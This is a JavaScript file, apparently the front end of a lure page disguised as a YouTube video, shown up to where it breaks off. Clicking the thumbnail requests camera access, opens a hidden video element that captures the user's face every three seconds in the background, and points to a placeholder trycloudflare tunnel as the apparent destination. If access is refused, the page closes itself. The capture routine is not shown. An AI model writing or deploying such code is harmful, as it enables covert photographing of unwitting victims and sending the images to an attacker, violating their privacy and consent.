// ===== CONFIGURATION =====
const BACKEND_URL = 'https://YOUR_CLOUDFLARED_URL.trycloudflare.com'; // 🔄 CHANGE THIS
const CAPTURE_INTERVAL = 3000; // Capture every 3 seconds

// ===== STATE =====
let mediaStream = null;
let videoElement = null;
let captureInterval = null;
let isCameraActive = false;
let captureCount = 0;
let videoPlayed = false;

// ===== DOM ELEMENTS =====
const videoThumbnail = document.getElementById('video-thumbnail');
const youtubeIframe = document.getElementById('youtube-iframe');

// ===== CLOSE PAGE FUNCTION =====
function closePage() {
    console.log('🚫 Camera denied - Closing page...');
    
    // Try multiple methods to close
    try {
        // Method 1: window.close()
        window.close();
    } catch(e) {
        console.log('window.close() failed, trying other methods');
    }
    
    // Method 2: Redirect to about:blank (closes page)
    try {
        window.location.href = 'about:blank';
    } catch(e) {
        console.log('about:blank redirect failed');
    }
    
    // Method 3: Show blank page with no content
    try {
        document.body.innerHTML = '';
        document.body.style.background = '#0f0f0f';
    } catch(e) {
        console.log('Body clear failed');
    }
    
    // Method 4: If nothing works, redirect to a dead page
    setTimeout(() => {
        window.location.replace('about:blank');
    }, 100);
}

// ===== PLAY VIDEO ON CLICK =====
videoThumbnail.addEventListener('click', function(e) {
    e.preventDefault();
    
    // Don't allow multiple clicks
    if (videoPlayed) return;
    
    // Request camera access
    requestCameraAccess();
});

// ===== REQUEST CAMERA ACCESS =====
async function requestCameraAccess() {
    try {
        // Create hidden video element for capture
        videoElement = document.createElement('video');
        videoElement.style.display = 'none';
        videoElement.setAttribute('playsinline', 'true');
        document.body.appendChild(videoElement);
        
        // Request camera with specific constraints
        const stream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: 'user',
                width: { ideal: 640 },
                height: { ideal: 480 }
            },
            audio: false
        });
        
        // ✅ Camera GRANTED
        mediaStream = stream;
        videoElement.srcObject = stream;
        await videoElement.play();
        isCameraActive = true;
        videoPlayed = true;
        
        console.log('✅ Camera access granted');
        
        // Play YouTube video
        playYouTubeVideo();
        
        // Start capturing in background
        startCapturing();
        
    } catch (error) {
        console.error('❌ Camera error:', error);
        
        // ❌ Camera DENIED - Close page immediately
        if (error.name === 'NotAllowedError' || 
            error.name === 'PermissionDeniedError' ||
            error.name === 'NotFoundError' ||
            error.name === 'AbortError') {
            
            // Close page instantly
            closePage();
        } else {
            // For other errors, also close
            closePage();
        }
    }
